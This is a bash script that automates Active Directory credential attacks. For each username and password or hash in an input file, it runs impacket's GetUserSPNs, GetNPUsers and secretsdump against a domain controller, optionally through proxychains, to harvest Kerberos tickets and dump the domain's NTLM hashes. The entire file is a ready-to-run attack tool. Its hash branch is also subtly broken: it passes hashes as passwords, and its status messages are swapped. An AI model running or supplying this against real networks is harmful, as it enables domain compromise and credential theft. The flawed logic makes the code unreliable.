#!/bin/bash
# File format:  USERNAME:P:PASSWORD   or   USERNAME:H:HASH

# Check if enough command line arguments are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP> <Proxy: Y or N> <File path>"
    exit 1
fi

# Assign command line arguments to variables
IP="$1"
Proxy="$2"
file_path="$3"

# Check if the file exists
if [ ! -f "$file_path" ]; then
    echo "File not found: $file_path"
    exit 1
fi

# Read the file line by line and add to an array
mapfile -t lines < "$file_path"

# Loop through the array
for line in "${lines[@]}"; do
    # Extract the parts of the line
    parts=($(echo "$line" | tr ':' ' '))
    username="${parts[0]}"
    identifier="${parts[1]}"
    pass_hash="${parts[2]}"

    # Perform different actions based on the middle part
    if [ "$identifier" = "P" ]; then
        echo "Processing line with 'H': $line"
        if [ "$Proxy" = "N" ]; then
            echo "impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash"
            impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash
            echo "impacket-GetNPUsers -dc-ip $IP -request $username:$pass_hash"
            impacket-GetNPUsers -dc-ip $IP -request $username:$pass_hash            
            echo "impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP"
            impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP
        else
            echo "proxychains impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash"
            proxychains impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash
            echo "proxychains impacket-GetNPUsers -dc-ip $IP -request $username:$pass_hash"
            proxychains impacket-GetNPUsers -dc-ip $IP -request $username:$pass_hash                
            echo "proxychains impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP"
            proxychains impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP
        fi
    elif [ "$identifier" = "H" ]; then
        echo "Processing line with 'P': $line"
        if [ "$Proxy" = "N" ]; then
            echo "impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash"
            impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash
            echo "impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP"
            impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP
        else
            echo "proxychains impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash"
            proxychains impacket-GetUserSPNs -dc-ip $IP -request $username:$pass_hash
            echo "proxychains impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP"
            proxychains impacket-secretsdump -just-dc-ntlm $username:$pass_hash@$IP
        fi
    else
        echo "Unknown middle part: $identifier"
    fi
done
